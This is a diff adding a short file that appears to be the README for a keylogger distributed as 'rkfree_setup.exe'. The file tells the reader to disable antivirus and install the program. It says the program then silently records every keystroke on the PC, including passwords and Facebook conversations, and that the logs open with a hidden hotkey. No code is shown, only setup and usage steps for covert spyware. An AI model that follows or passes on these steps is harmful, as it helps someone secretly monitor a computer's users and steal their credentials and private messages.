@@ -1,0 +1,4 @@
+> Installing <
+Disable antivirus, open the file "rkfree_setup.exe" then go to install now, check both options and go to continue. > Using <
+It's just going to start, then just close, ready ta ja recording everything that is typed on the PC, to see just hit (Ctrl + Alt + F9)
+It records passwords, facebook conversations etc ...
